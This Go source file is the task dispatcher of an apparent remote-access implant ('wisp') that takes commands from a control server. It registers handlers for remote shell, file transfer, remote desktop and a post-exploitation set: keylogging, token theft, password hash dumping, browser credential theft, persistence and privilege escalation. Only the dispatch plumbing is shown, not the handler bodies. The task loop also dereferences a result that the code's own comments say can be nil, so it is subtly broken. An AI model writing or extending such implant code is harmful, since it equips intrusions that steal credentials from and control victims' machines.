package commands

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/user/wisp/agent/transport"
	"github.com/user/wisp/shared/protocol"
)

// Task represents a task received from the server.
type Task struct {
	ID        string `json:"id"`
	CommandID int    `json:"command_id"`
	Args      string `json:"args"`
}

// Result is sent back to the server after executing a task.
type Result struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Status string `json:"status"` // "completed" or "failed"
}

// Command IDs come from the shared protocol package to avoid drift.
const (
	CmdShell         = int(protocol.CmdShell)
	CmdLs            = int(protocol.CmdLs)
	CmdCd            = int(protocol.CmdCd)
	CmdCat           = int(protocol.CmdCat)
	CmdUpload        = int(protocol.CmdUpload)
	CmdDownload      = int(protocol.CmdDownload)
	CmdPs            = int(protocol.CmdPs)
	CmdKillProc      = int(protocol.CmdKillProc)
	CmdSysinfo       = int(protocol.CmdSysinfo)
	CmdSleep         = int(protocol.CmdSleep)
	CmdExit          = int(protocol.CmdExit)
	CmdLsJSON        = int(protocol.CmdLsJSON)
	CmdMkdir         = int(protocol.CmdMkdir)
	CmdRm            = int(protocol.CmdRm)
	CmdRename        = int(protocol.CmdRename)
	CmdExecFile      = int(protocol.CmdExecFile)
	CmdIshellOpen    = int(protocol.CmdIshellOpen)
	CmdIshellRun     = int(protocol.CmdIshellRun)
	CmdIshellClose   = int(protocol.CmdIshellClose)
	CmdRDPStart      = int(protocol.CmdRDPStart)
	CmdRDPStop       = int(protocol.CmdRDPStop)
	CmdRDPInput      = int(protocol.CmdRDPInput)
	CmdRCPConnect    = int(protocol.CmdRCPConnect)
	CmdRCPDisconnect = int(protocol.CmdRCPDisconnect)
	CmdScreenshot    = int(protocol.CmdScreenshot)
	CmdPwd           = int(protocol.CmdPwd)
	CmdClientKill    = int(protocol.CmdClientKill)
	CmdHostReboot    = int(protocol.CmdHostReboot)
	CmdHostShutdown  = int(protocol.CmdHostShutdown)
	CmdHostLogoff    = int(protocol.CmdHostLogoff)
	CmdHostLock      = int(protocol.CmdHostLock)

	// Post-exploitation
	CmdJobList       = int(protocol.CmdJobList)
	CmdJobKill       = int(protocol.CmdJobKill)
	CmdPortscan      = int(protocol.CmdPortscan)
	CmdSocks         = int(protocol.CmdSocks)
	CmdPortfwd       = int(protocol.CmdPortfwd)
	CmdKeylog        = int(protocol.CmdKeylog)
	CmdClipboard     = int(protocol.CmdClipboard)
	CmdNetEnum       = int(protocol.CmdNetEnum)
	CmdTokenSteal    = int(protocol.CmdTokenSteal)
	CmdTokenRevert   = int(protocol.CmdTokenRevert)
	CmdHashdump      = int(protocol.CmdHashdump)
	CmdBrowserCreds  = int(protocol.CmdBrowserCreds)
	CmdPersist       = int(protocol.CmdPersist)
	CmdGetSystem     = int(protocol.CmdGetSystem)
)

// SleepCallback is called when the sleep command is received.
type SleepCallback func(sleep, jitter int)

// ExitCallback is called when the exit command is received.
type ExitCallback func()

// CommandTimeout is the default maximum runtime of a shell command before it is
// terminated (prevents a hung command from blocking the agent loop).
const CommandTimeout = 30 * time.Second

// CommandFunc is a task handler. Handlers resolve arguments from task.Args
// (JSON) and return a Result. A nil Result means the task was consumed as an
// async job and will be reported on a later checkin.
type CommandFunc func(d *Dispatcher, task *Task) *Result

// commandRegistry maps command IDs to their handlers. Built-in commands are
// registered in registerDefaults(); plugins can add entries at runtime via
// Register (the driver for hot-loadable modules).
type commandRegistry map[uint32]CommandFunc

// Dispatcher processes tasks and returns results.
type Dispatcher struct {
	OnSleep SleepCallback
	OnExit  ExitCallback
	cwd     string

	// registry maps command IDs to handlers. Initialised by registerDefaults()
	// and extended by plugins.
	registry commandRegistry

	// shellTimeout bounds how long a single shell command may run.
	shellTimeout time.Duration

	// interactive shell state (persistent process)
	ishell *ishellSession

	// forceExit enables the hard-exit safety net of CmdClientKill. Standalone
	// agents enable it; DLL agents leave it off so the host process survives.
	forceExit bool

	// remote desktop stream state
	rdpMu sync.Mutex
	rdp   *rdpSession

	// remote control channel client
	rcp *transport.RCPClient

	// async jobs (portscan, socks, keylog, ...)
	jobsMu sync.Mutex
	jobs   map[string]*job

	mu            sync.Mutex
	pendingBlocks []Result // queued download chunks waiting for the next checkin
}

// SetRCPClient attaches the remote control client used by CmdRCPConnect.
func (d *Dispatcher) SetRCPClient(c *transport.RCPClient) {
	d.rcp = c
}

// RCPClient returns the remote control client (nil when not configured).
func (d *Dispatcher) RCPClient() *transport.RCPClient {
	return d.rcp
}

// SetForceExit toggles whether CmdClientKill may hard-exit the process.
func (d *Dispatcher) SetForceExit(enabled bool) {
	d.forceExit = enabled
}

// NewDispatcher creates a new command dispatcher.
func NewDispatcher(onSleep SleepCallback, onExit ExitCallback) *Dispatcher {
	d := &Dispatcher{
		OnSleep:      onSleep,
		OnExit:       onExit,
		shellTimeout: CommandTimeout,
		registry:     make(commandRegistry),
		jobs:         make(map[string]*job),
	}
	d.registerDefaults()
	return d
}

// Register installs a command handler. It returns an error when the ID is
// already taken, allowing plugins to detect conflicting modules.
func (d *Dispatcher) Register(id uint32, fn CommandFunc) error {
	if d.registry == nil {
		d.registry = make(commandRegistry)
	}
	if _, exists := d.registry[id]; exists {
		return fmt.Errorf("command %d already registered", id)
	}
	d.registry[id] = fn
	return nil
}

// Unregister removes a command handler. Used by the plugin lifecycle.
func (d *Dispatcher) Unregister(id uint32) {
	delete(d.registry, id)
}

// HasCommand reports whether a command ID is registered.
func (d *Dispatcher) HasCommand(id uint32) bool {
	_, ok := d.registry[id]
	return ok
}

// registerDefaults wires every built-in command into the registry. Keeping the
// table here (instead of a switch in Execute) means plugins and new modules can
// register alongside built-ins through the same path.
func (d *Dispatcher) registerDefaults() {
	d.registry = commandRegistry{
		uint32(CmdShell):         func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execShell(t.Args), "") },
		uint32(CmdLs):            func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execLs(t.Args), "") },
		uint32(CmdCd):            func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execCd(t.Args), "") },
		uint32(CmdCat):           func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execCat(t.Args), "") },
		uint32(CmdPs):            func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execPs(), "") },
		uint32(CmdKillProc):      func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execKill(t.Args), "") },
		uint32(CmdSysinfo):       func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execSysinfo(), "") },
		uint32(CmdSleep):         func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execSleep(t.Args), "") },
		uint32(CmdExit):          d.execExit,
		uint32(CmdUpload):        func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execUpload(t.Args), "") },
		uint32(CmdDownload):      func(d *Dispatcher, t *Task) *Result { return d.execDownload(t) },
		uint32(CmdLsJSON):        func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execLsJSON(t.Args), "") },
		uint32(CmdMkdir):         func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execMkdir(t.Args), "") },
		uint32(CmdRm):            func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRm(t.Args), "") },
		uint32(CmdRename):        func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRename(t.Args), "") },
		uint32(CmdExecFile):      func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execExecFile(t.Args), "") },
		uint32(CmdIshellOpen):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execIshellOpen(t.Args), "") },
		uint32(CmdIshellRun):     func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execIshellRun(t.Args), "") },
		uint32(CmdIshellClose):   func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execIshellClose(), "") },
		uint32(CmdRDPStart):      func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRDPStart(t.Args), "") },
		uint32(CmdRDPStop):       func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRDPStop(), "") },
		uint32(CmdRDPInput):      func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRDPInput(t.Args), "") },
		uint32(CmdRCPConnect):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRCPConnect(t.Args), "") },
		uint32(CmdRCPDisconnect): func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execRCPDisconnect(), "") },
		uint32(CmdScreenshot):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execScreenshot(), "") },
		uint32(CmdPwd):           func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execPwd(), "") },
		uint32(CmdClientKill):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, d.execClientKill(), "") },
		uint32(CmdHostReboot):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostReboot(), "") },
		uint32(CmdHostShutdown):  func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostShutdown(), "") },
		uint32(CmdHostLogoff):    func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostLogoff(), "") },
		uint32(CmdHostLock):      func(d *Dispatcher, t *Task) *Result { return d.finish(t, execHostLock(), "") },
		uint32(CmdJobList):       d.execJobListCmd,
		uint32(CmdJobKill):       d.execJobKillCmd,
		uint32(CmdPortscan):      d.execPortscanCmd,
		uint32(CmdSocks):         d.execSocksCmd,
		uint32(CmdPortfwd):       d.execPortfwdCmd,
		uint32(CmdKeylog):        d.execKeylogCmd,
		uint32(CmdClipboard):     d.execClipboardCmd,
		uint32(CmdNetEnum):       d.execNetEnumCmd,
		uint32(CmdTokenSteal):    d.execTokenStealCmd,
		uint32(CmdTokenRevert):   d.execTokenRevertCmd,
		uint32(CmdHashdump):      d.execHashdumpCmd,
		uint32(CmdBrowserCreds):  d.execBrowserCredsCmd,
		uint32(CmdPersist):       d.execPersistCmd,
		uint32(CmdGetSystem):     d.execGetSystemCmd,
	}
}

// DrainPending returns and clears the queued download chunks that still need
// to be reported to the server on the next checkin.
func (d *Dispatcher) DrainPending() []Result {
	d.mu.Lock()
	defer d.mu.Unlock()
	if len(d.pendingBlocks) == 0 {
		return nil
	}
	out := d.pendingBlocks
	d.pendingBlocks = nil
	return out
}

// queueBlocks appends download chunks to be reported on a later checkin.
func (d *Dispatcher) queueBlocks(blocks []Result) {
	if len(blocks) == 0 {
		return
	}
	d.mu.Lock()
	defer d.mu.Unlock()
	d.pendingBlocks = append(d.pendingBlocks, blocks...)
}

// finish wraps a plain string result into a completed Result.
func (d *Dispatcher) finish(task *Task, output, status string) *Result {
	if status == "" {
		status = "completed"
	}
	return &Result{TaskID: task.ID, Output: output, Status: status}
}

// Execute runs a task and returns the result. The handler is resolved through
// the registry so plugins participate in the exact same path as built-ins.
func (d *Dispatcher) Execute(task *Task) *Result {
	if task == nil {
		return nil
	}
	if fn, ok := d.registry[uint32(task.CommandID)]; ok {
		return fn(d, task)
	}
	return &Result{
		TaskID: task.ID,
		Output: fmt.Sprintf("unknown command: %d", task.CommandID),
		Status: "failed",
	}
}

// ProcessTasks takes raw JSON task data and executes each task.
func (d *Dispatcher) ProcessTasks(tasksJSON []byte) ([]Result, error) {
	var tasks []Task
	if err := json.Unmarshal(tasksJSON, &tasks); err != nil {
		return nil, fmt.Errorf("unmarshal tasks: %w", err)
	}

	var results []Result
	for _, task := range tasks {
		result := d.Execute(&task)
		results = append(results, *result)
	}
	return results, nil
}

// execExit terminates the agent loop via OnExit.
func (d *Dispatcher) execExit(_ *Dispatcher, task *Task) *Result {
	if d.OnExit != nil {
		d.OnExit()
	}
	return d.finish(task, "agent exiting", "")
}
